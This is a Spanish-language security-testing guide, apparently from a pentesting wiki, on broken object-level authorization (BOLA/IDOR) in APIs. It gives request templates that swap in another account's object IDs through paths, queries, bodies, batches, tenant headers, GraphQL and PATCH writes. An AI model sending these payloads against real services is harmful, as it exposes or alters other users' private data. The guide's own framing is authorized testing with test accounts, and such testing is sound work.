# 🗡️ BOLA: autorización rota por objeto: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### ID en ruta, query y cuerpo

```text
GET /api/orders/{ID_CONTROLADO_B}
GET /api/orders?id={ID_CONTROLADO_B}
POST /api/orders/read  {"orderId":"{ID_CONTROLADO_B}"}
```

**Cuándo usarlo:** A usa su token para un objeto creado por B de prueba. Confirmar dato privado real, no solo status.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).


### Identificadores y codificaciones de prueba

```text
{ID_NUMERICO_B}
{UUID_CONOCIDO_B}
{SLUG_CONOCIDO_B}
{ID_BASE64_DE_OBJETO_B}
```

**Cuándo usarlo:** No enumerar terceros. La opacidad del ID nunca sustituye un chequeo de autorización.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References).


## 🧭 Payloads por contexto

### Rutas secundarias del mismo objeto

```text
GET /api/orders/{ID_CONTROLADO_B}/download
GET /api/orders/{ID_CONTROLADO_B}/events
GET /api/orders/{ID_CONTROLADO_B}/attachments
PATCH /api/orders/{ID_CONTROLADO_B}  {"label":"canary-{NONCE}"}
```

**Cuándo usarlo:** La escritura solo se prueba con objeto reversible de B y acuerdo previo; verificar permisos en cada endpoint.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).


## 🔥 Payloads avanzados

### Lotes y relación entre tenant y objeto

```text
POST /api/orders/batch  Authorization: Bearer {TOKEN_A}  body={"ids":["{ID_PROPIO}","{ID_CONTROLADO_B}"]}
GET /api/tenants/{TENANT_A}/orders/{ID_CONTROLADO_B}  Authorization: Bearer {TOKEN_A}
GET /api/tenants/{TENANT_B}/orders/{ID_CONTROLADO_B}  Authorization: Bearer {TOKEN_A}
```

**Cuándo usarlo:** Tres patrones abreviados y alternativos, no una única petición HTTP. A usa su token; B y ambos tenants son cuentas de prueba. Validar pertenencia del objeto y permisos de cada elemento del lote.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).


## 🔬 Pruebas guiadas por escenario

### 1. ID en path

**Objetivo:** A solicita objeto creado por B de prueba.

```http
GET /api/v1/orders/{ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Confirmar que el cuerpo contiene un dato privado de B; status 200 genérico no basta.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 2. ID en query

**Objetivo:** Probar la misma política cuando el ID viaja como parámetro.

```http
GET /api/v1/orders?id={ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Comparar con ID propio y con ID inexistente para descartar fallback.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 3. ID en body

**Objetivo:** Verificar política de un resolver de lectura POST.

```json
{"orderId":"{ID_CONTROLADO_B}","include":"summary"}
```

**Interpretación:** Mantener token A y cuerpo idéntico salvo ID; usar datos de dos cuentas propias.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 4. Objeto hijo

**Objetivo:** Comprobar que autorización del padre cubre al hijo.

```http
GET /api/v1/projects/{PROYECTO_PROPIO}/files/{ARCHIVO_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** El archivo de B debe denegarse aunque el proyecto de A exista; adaptar relación real.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control/idor).

### 5. Batch mixto

**Objetivo:** Comprobar autorización por cada elemento de una lista.

```json
{"ids":["{ID_PROPIO}","{ID_CONTROLADO_B}"]}
```

**Interpretación:** La respuesta no debe filtrar el elemento B por estar junto al A.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 6. Descarga por identificador

**Objetivo:** Comparar política del endpoint de archivos.

```http
GET /api/v1/documents/{ID_CONTROLADO_B}/download HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** No descargar documentos ajenos; B debe crear el canary de prueba.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 7. Método PATCH reversible

**Objetivo:** Verificar escritura sobre objeto B sin afectarlo de forma irreversible.

```http
PATCH /api/v1/objects/{ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"label":"canary-{NONCE}"}
```

**Interpretación:** B confirma estado antes/después y restaura etiqueta; requiere permiso explícito para cambios.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 8. Tenant e ID en ruta

**Objetivo:** Comprobar autorización compuesta cuando tenant y objeto viajan en segmentos distintos.

```http
GET /api/v1/tenants/{TENANT_B_CONTROLADO}/objects/{ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Con token del tenant A, verificar que no se devuelva el objeto privado de B; usar solo tenants propios.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 9. Tenant en cabecera

**Objetivo:** Comprobar que el tenant no se elige solo con input cliente.

```http
GET /api/v1/objects/{ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
X-Tenant-ID: {TENANT_B}
```

**Interpretación:** Debe vincularse al token y política servidor. Diferencia de error no equivale a lectura.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 10. GraphQL resolver directo

**Objetivo:** Probar el mismo documento de B mediante un resolver distinto del node genérico.

```json
{"query":"query($id:ID!){document(id:$id){id privateNote}}","variables":{"id":"{ID_CONTROLADO_B}"}}
```

**Interpretación:** Adaptar document/privateNote al esquema; con token A, comparar la nota propia de B y la respuesta REST.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 11. Update masivo de dos IDs

**Objetivo:** Comprobar autorización por cada elemento de una mutación batch reversible.

```json
{"items":[{"id":"{ID_PROPIO}","label":"canary-A"},{"id":"{ID_CONTROLADO_B}","label":"canary-B"}]}
```

**Interpretación:** Con token A y objetos A/B propios, verificar que B queda intacto y restaurar A.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 12. Objeto compartido tras revocar acceso

**Objetivo:** Probar que una capacidad retirada ya no autoriza una lectura.

```http
GET /api/v1/shared/{ID_CONTROLADO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** B comparte y luego revoca el objeto de prueba; controlar caché antes de atribuir acceso residual.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
